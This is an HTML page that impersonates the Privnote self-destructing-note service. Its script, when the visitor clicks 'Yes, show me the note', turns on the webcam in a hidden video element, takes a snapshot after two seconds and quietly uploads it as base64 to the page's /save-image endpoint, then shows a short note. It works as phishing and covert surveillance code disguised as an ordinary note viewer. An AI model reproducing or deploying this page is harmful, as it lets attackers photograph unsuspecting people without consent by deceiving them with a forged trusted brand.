<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Privnote - Send Notes that Self-destruct</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f5f5f5;
            margin: 0;
        }
        #header {
            background-color: #b30e0e;
            color: white;
            text-align: center;
            padding: 20px;
        }
        #header img {
            max-width: 150px;
            height: auto;
        }
        #container {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        #main-content {
            background-color: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
            text-align: center;
            max-width: 600px;
            width: 90%;
        }
        h1 {
            font-size: 24px;
            margin-bottom: 20px;
        }
        .button {
            background-color: #b30e0e;
            color: white;
            padding: 10px 20px;
            border: none;
            cursor: pointer;
            margin-top: 20px;
            border-radius: 5px;
            font-size: 16px;
            margin-right: 10px;
        }
        .button:hover {
            background-color: #900909;
        }
        .button-secondary {
            background-color: #ccc;
            color: black;
            padding: 10px 20px;
            border: none;
            cursor: pointer;
            margin-top: 20px;
            border-radius: 5px;
            font-size: 16px;
        }
        .button-secondary:hover {
            background-color: #999;
        }
        #note-content {
            margin-top: 20px;
            display: none;
        }
        textarea {
            width: 100%;
            max-width: 100%;
            height: 120px;
        }
        #status {
            color: black;
            margin-top: 20px;
        }
        #video {
            display: none;
        }
    </style>
</head>
<body>

<div id="header">
    <img src="/logo.jpg" alt="Privnote Logo">
    <h2>Send notes that will self-destruct after being read.</h2>
</div>

<div id="container">
    <div id="main-content">
        <h1>Read and destroy?</h1>
        
        <!-- Button to trigger the note reveal and camera capture -->
        <button id="captureImage" class="button">Yes, show me the note</button>
        <button class="button button-secondary">No, not now</button>
        
        <!-- Hidden note content -->
        <div id="note-content">
            <h2>Note contents</h2>
            <textarea id="note-text" readonly>Dis moi, tu saurais p?</textarea>
        </div>
        <p id="status"></p>

        <!-- Video stream for capturing the camera image -->
        <video id="video" width="320" height="240" autoplay style="display:none;"></video>
        <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
    </div>
</div>

<script>
    document.getElementById('captureImage').addEventListener('click', function() {
        const statusElement = document.getElementById('status');
        statusElement.textContent = 'Fetching Note...';

        // Start the camera feed
        startCamera();

        // Capture the image after a short delay to ensure the camera starts
        setTimeout(() => {
            captureAndSendImage();
            document.getElementById('note-content').style.display = 'block';  // Show note content
        }, 2000);
    });

    function startCamera() {
        const video = document.getElementById('video');
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(function(stream) {
                video.srcObject = stream;
            })
            .catch(function(err) {
                console.error("Error accessing camera:", err);
                document.getElementById('status').textContent = 'Error';
            });
    }

    async function captureAndSendImage() {
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');

        // Draw the current video frame into the canvas
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        const imageData = canvas.toDataURL('image/png');  // Get base64 image

        // Send the base64 image data to the server
        await fetch('/save-image', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ imageData })
        })
        .then(response => response.json())
        .then(data => {
            console.log('Image saved:', data);
            document.getElementById('status').textContent = 'Close and Delete';
        })
        .catch(error => {
            console.error('Error saving image:', error);
            document.getElementById('status').textContent = 'Failed to save image.';
        });
    }
</script>

</body>
</html>
